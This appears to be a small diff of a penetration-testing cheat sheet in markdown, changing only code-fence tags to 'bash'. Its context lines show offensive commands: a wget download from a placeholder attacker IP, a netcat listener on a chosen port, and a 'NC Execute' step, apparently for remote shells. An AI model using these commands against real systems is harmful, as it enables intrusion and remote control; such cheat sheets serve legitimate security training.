@@ -407,7 +407,7 @@ wget http://{IP ADDRESS}/{FILE} -outfile {FILE}
 
 <br />
 
-```
+```bash
 # About: A command used to listen to requests from a defined port
 # Download: Pre-installed on Kali Linux
 
@@ -421,7 +421,7 @@ sudo nc –lnvp {PORT}
 
 ## NC Execute - Server [STEP 2]
 
-```
+```bash
 # With Netcat installed
 
 # Usage - Windows
